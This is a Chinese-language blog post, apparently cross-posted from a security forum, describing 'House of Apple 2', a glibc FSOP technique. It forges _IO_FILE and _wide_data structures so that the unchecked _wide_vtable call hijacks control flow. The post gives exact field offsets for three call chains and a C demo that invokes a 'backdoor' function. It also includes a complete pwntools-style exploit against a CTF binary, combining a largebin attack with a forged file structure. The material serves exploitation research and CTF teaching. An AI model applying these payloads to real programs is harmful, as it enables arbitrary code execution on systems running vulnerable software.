# House of Apple 一种新的glibc中IO攻击方法 (2)


> 本文首发于[看雪论坛](https://bbs.pediy.com/thread-273832.htm)，仅在个人博客记录

分享一系列新的`glibc`中`IO`利用思路，暂且命名为`house of apple`。
这篇是`house of apple2`。
本站的`house of apple`系列文章的地址为：

- [house of apple1](https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/)
- [house of apple2](https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/)
- [house of apple3](https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-3/)

<!--more-->

## 前言

之前提出了一种新的`IO`利用方法`house of apple1`。本篇是`house of apple1`的续集，继续给出基于`IO_FILE->_wide_data`的利用技巧。

在 `house of apple1`的总结里面提到: `house of apple1` 的利用链可以在任意地址写堆地址，相当于一次`largebin attack`的效果。因此，`house of apple1` 需要和其他方法结合而进行后续的`FSOP`利用。

那么在只劫持`_wide_data`的条件下能不能控制程序的执行流呢？答案是肯定的。

本篇的`house of apple2`会提出几条新的`IO`利用链，在劫持`_IO_FILE->_wide_data`的基础上，直接控制程序执行流。

关于前置知识这里就不赘述了，详情可看 `house of apple1`。

## 利用条件

使用`house of apple2`的条件为：
- 已知`heap`地址和`glibc`地址
- 能控制程序执行`IO`操作，包括但不限于：从`main`函数返回、调用`exit`函数、通过`__malloc_assert`触发
- 能控制`_IO_FILE`的`vtable`和`_wide_data`，一般使用`largebin attack`去控制

## 利用原理

`stdin/stdout/stderr`这三个`_IO_FILE`结构体使用的是`_IO_file_jumps`这个`vtable`，而当需要调用到`vtable`里面的函数指针时，会使用宏去调用。以`_IO_file_overflow`调用为例，`glibc`中调用的代码片段分析如下

```c
#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)

#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)

# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))
```

其中，`IO_validate_vtable`函数负责检查`vtable`的合法性，会判断`vtable`的地址是不是在一个合法的区间。如果`vtable`的地址不合法，程序将会异常终止。

观察`struct _IO_wide_data`结构体，发现其对应有一个`_wide_vtable`成员。
```c
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;    /* Current read pointer */
  wchar_t *_IO_read_end;    /* End of get area. */
  wchar_t *_IO_read_base;    /* Start of putback+get area. */
  wchar_t *_IO_write_base;    /* Start of put area. */
  wchar_t *_IO_write_ptr;    /* Current put pointer. */
  wchar_t *_IO_write_end;    /* End of put area. */
  wchar_t *_IO_buf_base;    /* Start of reserve area. */
  wchar_t *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;    /* Pointer to first valid character of
                   backup area */
  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */
 
  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;
  wchar_t _shortbuf[1];
  const struct _IO_jump_t *_wide_vtable;
};
```

在调用`_wide_vtable`虚表里面的函数时，同样是使用宏去调用，仍然以`vtable->_overflow`调用为例，所用到的宏依次为：

```c
#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)

#define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)

#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)

#define _IO_WIDE_JUMPS(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable

```
可以看到，在调用`_wide_vtable`里面的成员函数指针时，**没有关于vtable的合法性检查**。

因此，我们可以劫持`IO_FILE`的`vtable`为`_IO_wfile_jumps`，控制`_wide_data`为可控的堆地址空间，进而控制`_wide_data->_wide_vtable`为可控的堆地址空间。控制程序执行`IO`流函数调用，最终调用到`_IO_Wxxxxx`函数即可控制程序的执行流。

以下面提到的`_IO_wdefault_xsgetn`函数利用为例，编写`demo`示例如下：
```c
#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
#include <string.h>

void backdoor()
{
    printf("\033[31m[!] Backdoor is called!\n");
    _exit(0);
}

void main()
{
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    setbuf(stderr, 0);

    char *p1 = calloc(0x200, 1);
    char *p2 = calloc(0x200, 1);
    puts("[*] allocate two 0x200 chunks");

    size_t puts_addr = (size_t)&puts;
    printf("[*] puts address: %p\n", (void *)puts_addr);
    size_t libc_base_addr = puts_addr - 0x84420;
    printf("[*] libc base address: %p\n", (void *)libc_base_addr);

    size_t _IO_2_1_stderr_addr = libc_base_addr + 0x1ed5c0;
    printf("[*] _IO_2_1_stderr_ address: %p\n", (void *)_IO_2_1_stderr_addr);

    size_t _IO_wstrn_jumps_addr = libc_base_addr + 0x1e8c60;
    printf("[*] _IO_wstrn_jumps address: %p\n", (void *)_IO_wstrn_jumps_addr);
 
    char *stderr2 = (char *)_IO_2_1_stderr_addr;
    puts("[+] step 1: change stderr->_flags to 0x800");
    *(size_t *)stderr2 = 0x800;

    puts("[+] step 2: change stderr->_mode to 1");
    *(size_t *)(stderr2 + 0xc0) = 1;
 
    puts("[+] step 3: change stderr->vtable to _IO_wstrn_jumps-0x20");
    *(size_t *)(stderr2 + 0xd8) = _IO_wstrn_jumps_addr-0x20;
 
    puts("[+] step 4: replace stderr->_wide_data with the allocated chunk p1");
    *(size_t *)(stderr2 + 0xa0) = (size_t)p1;
 
    puts("[+] step 5: set stderr->_wide_data->_wide_vtable with the allocated chunk p2");
    *(size_t *)(p1 + 0xe0) = (size_t)p2;

    puts("[+] step 6: set stderr->_wide_data->_wide_vtable->_IO_write_ptr >  stderr->_wide_data->_wide_vtable->_IO_write_base");
    *(size_t *)(p1 + 0x20) = (size_t)1;

    puts("[+] step 7: put backdoor at fake _wide_vtable->_overflow");
    *(size_t *)(p2 + 0x18) = (size_t)(&backdoor);

    puts("[+] step 8: call fflush(stderr) to trigger backdoor func");
    fflush(stderr);

}

```

编译后输出：
```
[*] allocate two 0x200 chunks
[*] puts address: 0x7f8f73d2e420
[*] libc base address: 0x7f8f73caa000
[*] _IO_2_1_stderr_ address: 0x7f8f73e975c0
[*] _IO_wstrn_jumps address: 0x7f8f73e92c60
[+] step 1: change stderr->_flags to 0x800
[+] step 2: change stderr->_mode to 1
[+] step 3: change stderr->vtable to _IO_wstrn_jumps-0x20
[+] step 4: replace stderr->_wide_data with the allocated chunk p1
[+] step 5: set stderr->_wide_data->_wide_vtable with the allocated chunk p2
[+] step 6: set stderr->_wide_data->_wide_vtable->_IO_write_ptr >  stderr->_wide_data->_wide_vtable->_IO_write_base
[+] step 7: put backdoor at fake _wide_vtable->_overflow
[+] step 8: call fflush(stderr) to trigger backdoor func
[!] Backdoor is called!
```
可以看到，成功调用了后门函数。

## 利用思路 
目前在`glibc`源码中搜索到的`_IO_WXXXXX`系列函数的调用只有`_IO_WSETBUF`、`_IO_WUNDERFLOW`、`_IO_WDOALLOCATE`和`_IO_WOVERFLOW`。
其中`_IO_WSETBUF`和`_IO_WUNDERFLOW`目前无法利用或利用困难，其余的均可构造合适的`_IO_FILE`进行利用。这里给出我总结的几条比较好利用的链。以下使用`fp`指代`_IO_FILE`结构体变量。

### 利用_IO_wfile_overflow函数控制程序执行流
对`fp`的设置如下：

- `_flags`设置为`~(2 | 0x8 | 0x800)`，如果不需要控制`rdi`，设置为`0`即可；如果需要获得`shell`，可设置为`  sh;`，注意前面有两个空格
- `vtable`设置为`_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_overflow`即可
- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`
- `_wide_data->_IO_write_base`设置为`0`，即满足`*(A + 0x18) = 0`
- `_wide_data->_IO_buf_base`设置为`0`，即满足`*(A + 0x30) = 0`
- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`
- `_wide_data->_wide_vtable->doallocate`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x68) = C`

函数的调用链如下：
```
_IO_wfile_overflow
    _IO_wdoallocbuf
        _IO_WDOALLOCATE
            *(fp->_wide_data->_wide_vtable + 0x68)(fp)
```

详细分析如下：
首先看`_IO_wfile_overflow`函数
```c
wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == 0)
	{
	  _IO_wdoallocbuf (f);// 需要走到这里
      // ......
    }
    }
}
```
需要满足`f->_flags & _IO_NO_WRITES == 0`并且`f->_flags & _IO_CURRENTLY_PUTTING == 0`和`f->_wide_data->_IO_write_base == 0`

然后看`_IO_wdoallocbuf`函数：
```c
void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)// _IO_WXXXX调用
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
		     fp->_wide_data->_shortbuf + 1, 0);
}
libc_hidden_def (_IO_wdoallocbuf)
```
需要满足`fp->_wide_data->_IO_buf_base != 0`和`fp->_flags & _IO_UNBUFFERED == 0`。

### 利用_IO_wfile_underflow_mmap函数控制程序执行流
对`fp`的设置如下：

- `_flags`设置为`~4`，如果不需要控制`rdi`，设置为`0`即可；如果需要获得`shell`，可设置为` sh;`，注意前面有个空格
- `vtable`设置为`_IO_wfile_jumps_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_underflow_mmap`即可
- `_IO_read_ptr < _IO_read_end`，即满足`*(fp + 8) < *(fp + 0x10)`
- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`
- `_wide_data->_IO_read_ptr >= _wide_data->_IO_read_end`，即满足`*A >= *(A + 8)`
- `_wide_data->_IO_buf_base`设置为`0`，即满足`*(A + 0x30) = 0`
- `_wide_data->_IO_save_base`设置为`0`或者合法的可被`free`的地址，即满足`*(A + 0x40) = 0`
- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`
- `_wide_data->_wide_vtable->doallocate`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x68) = C`

函数的调用链如下：
```
_IO_wfile_underflow_mmap
    _IO_wdoallocbuf
        _IO_WDOALLOCATE
            *(fp->_wide_data->_wide_vtable + 0x68)(fp)
```

详细分析如下：
看`_IO_wfile_underflow_mmap`函数：
```c
static wint_t
_IO_wfile_underflow_mmap (FILE *fp)
{
  struct _IO_codecvt *cd;
  const char *read_stop;

  if (__glibc_unlikely (fp->_flags & _IO_NO_READS))
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
    return *fp->_wide_data->_IO_read_ptr;

  cd = fp->_codecvt;

  /* Maybe there is something left in the external buffer.  */
  if (fp->_IO_read_ptr >= fp->_IO_read_end
      /* No.  But maybe the read buffer is not fully set up.  */
      && _IO_file_underflow_mmap (fp) == EOF)
    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error
       flags as appropriate.  */
    return WEOF;

  /* There is more in the external.  Convert it.  */
  read_stop = (const char *) fp->_IO_read_ptr;

  if (fp->_wide_data->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_wide_data->_IO_save_base != NULL)
	{
	  free (fp->_wide_data->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_wdoallocbuf (fp);// 需要走到这里
    }
    //......
}
```
需要设置`fp->_flags & _IO_NO_READS == 0`，设置`fp->_wide_data->_IO_read_ptr >= fp->_wide_data->_IO_read_end`，设置`fp->_IO_read_ptr < fp->_IO_read_end`不进入调用，设置`fp->_wide_data->_IO_buf_base == NULL`和`fp->_wide_data->_IO_save_base == NULL`。


### 利用_IO_wdefault_xsgetn函数控制程序执行流

**这条链执行的条件是调用到_IO_wdefault_xsgetn时rdx寄存器，也就是第三个参数不为0**。如果不满足这个条件，可选用其他链。

对`fp`的设置如下：

- `_flags`设置为`0x800`
- `vtable`设置为`_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps`地址（加减偏移），使其能成功调用`_IO_wdefault_xsgetn`即可
- `_mode`设置为大于`0`，即满足`*(fp + 0xc0) > 0`
- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`
- `_wide_data->_IO_read_end == _wide_data->_IO_read_ptr`设置为`0`，即满足`*(A + 8) = *A`
- `_wide_data->_IO_write_ptr > _wide_data->_IO_write_base`，即满足`*(A + 0x20) > *(A + 0x18)`
- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`
- `_wide_data->_wide_vtable->overflow`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x18) = C`

函数的调用链如下：
```
_IO_wdefault_xsgetn
    __wunderflow
        _IO_switch_to_wget_mode
            _IO_WOVERFLOW
                *(fp->_wide_data->_wide_vtable + 0x18)(fp)
```

详细分析如下：
首先看`_IO_wdefault_xsgetn`函数：
```c
size_t
_IO_wdefault_xsgetn (FILE *fp, void *data, size_t n)
{
  size_t more = n;
  wchar_t *s = (wchar_t*) data;
  for (;;)
    {
      /* Data available. */
      ssize_t count = (fp->_wide_data->_IO_read_end
                       - fp->_wide_data->_IO_read_ptr);
      if (count > 0)
	{
	  if ((size_t) count > more)
	    count = more;
	  if (count > 20)
	    {
	      s = __wmempcpy (s, fp->_wide_data->_IO_read_ptr, count);
	      fp->_wide_data->_IO_read_ptr += count;
	    }
	  else if (count <= 0)
	    count = 0;
	  else
	    {
	      wchar_t *p = fp->_wide_data->_IO_read_ptr;
	      int i = (int) count;
	      while (--i >= 0)
		*s++ = *p++;
	      fp->_wide_data->_IO_read_ptr = p;
            }
            more -= count;
        }
      if (more == 0 || __wunderflow (fp) == WEOF)
	break;
    }
  return n - more;
}
libc_hidden_def (_IO_wdefault_xsgetn)
```
由于`more`是第三个参数，所以不能为`0`。
直接设置`fp->_wide_data->_IO_read_ptr == fp->_wide_data->_IO_read_end`，使得`count`为`0`，不进入`if`分支。
随后当`more != 0`时会进入`__wunderflow`。

接着看`__wunderflow`：
```c
wint_t
__wunderflow (FILE *fp)
{
  if (fp->_mode < 0 || (fp->_mode == 0 && _IO_fwide (fp, 1) != 1))
    return WEOF;

  if (fp->_mode == 0)
    _IO_fwide (fp, 1);
  if (_IO_in_put_mode (fp))
    if (_IO_switch_to_wget_mode (fp) == EOF)
      return WEOF;
    // ......
}
```

要想调用到`_IO_switch_to_wget_mode`，需要设置`fp->mode > 0`，并且`fp->_flags & _IO_CURRENTLY_PUTTING != 0`。

然后在`_IO_switch_to_wget_mode`函数中：
```c
int
_IO_switch_to_wget_mode (FILE *fp)
{
  if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF) // 需要走到这里
      return EOF;
    // .....
}
```

当满足`fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base`时就会调用`_IO_WOVERFLOW(fp)`。


## 例题分析

仍然以`house of apple1` 中的`pwn_oneday`为例。

程序的详细分析就不在此赘述。为了方便展示利用效果，后面的`rop`部分就不做了，我们利用本篇文章提出的方法输出`  hack!`字符串。

在`largebin attack`攻击`_IO_list_all`之后，伪造`_IO_FILE`结构：
```python
target_addr = libc.sym._IO_list_all
_IO_wfile_jumps = libc.sym._IO_wfile_jumps

_lock = libc_base + 0x1f5720
fake_IO_FILE = heap_base + 0x1810

f1 = IO_FILE_plus_struct()
f1.flags = u64_ex("  hack!")
f1._IO_read_ptr = 0xa81
f1._lock = _lock
f1._wide_data = fake_IO_FILE + 0xe0
f1.vtable = _IO_wfile_jumps
```
所以最后的`exp`为：

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
 
from pwncli import *
 
cli_script()
 
io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']
 
small = 1
medium = 2
large = 3
key = 10
 
def add(c):
    sla("enter your command: \n", "1")
    sla("choise: ", str(c))
 
def dele(i):
    sla("enter your command: \n", "2")
    sla("Index: \n", str(i))
 
def read_once(i, data):
    sla("enter your command: \n", "3")
    sla("Index: ", str(i))
    sa("Message: \n", flat(data, length=0x110 * key))
 
def write_once(i):
    sla("enter your command: \n", "4")
    sla("Index: ", str(i))
    ru("Message: \n")
    m = rn(0x10)
    d1 = u64_ex(m[:8])
    d2 = u64_ex(m[8:])
    log_address_ex("d1")
    log_address_ex("d2")
    return d1, d2
 
def bye():
    sla("enter your command: \n", "9")
 
 
sla("enter your key >>\n", str(key))
 
add(medium)
add(medium)
add(small)
 
dele(2)
dele(1)
dele(0)
 
add(small)
add(small)
add(small)
add(small)
 
dele(3)
dele(5)
m1, m2 = write_once(3)
libc_base = set_current_libc_base_and_log(m1, 0x1f2cc0)
heap_base = m2 - 0x17f0
 
dele(4)
dele(6)
 
add(large)
add(small)
add(small)
 
dele(8)
add(large)
 
target_addr = libc.sym._IO_list_all
_IO_wfile_jumps = libc.sym._IO_wfile_jumps

_lock = libc_base + 0x1f5720
fake_IO_FILE = heap_base + 0x1810

f1 = IO_FILE_plus_struct()
f1.flags = u64_ex("  hack!")
f1._IO_read_ptr = 0xa81
f1._lock = _lock
f1._wide_data = fake_IO_FILE + 0xe0
f1.vtable = _IO_wfile_jumps

data = flat({
    0x8: target_addr - 0x20,
    0x10: {
        0: {
            0: bytes(f1),
            0xe0: {# _wide_data->_wide_vtable
                0x18: 0, # f->_wide_data->_IO_write_base
                0x30: 0, # f->_wide_data->_IO_buf_base
                0xe0: fake_IO_FILE+0x200
            },
            0x200: {
                0x68: libc.sym.puts
            }
        },
        0xa80: [0, 0xab1]
    }
})

read_once(5, data)
 
dele(2)
add(large)
 
bye()
 
ia()

```
调试如下：
通过`exit`执行到`_IO_wdoallocbuf`：
![img](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/956675_ASSEB7VMXFTN9QB.png)

成功输出`  hack!`：
![img](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/956675_HWBMD56GGGJHADA.png)

## 总结

`house of apple`主要关注对`_IO_FILE->_wide_data`成员的攻击，并可以在劫持该成员之后改写地址内容或者控制程序执行流。

可以看到，对`_wide_data->_wide_vtable`虚表的成员函数指针调用时并不存在`vtable`的检查，因此，可以利用该漏洞进行`FSOP`。

在实际利用的时候，可以观察寄存器的值，以便选择合适的`gadget`。


---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/  

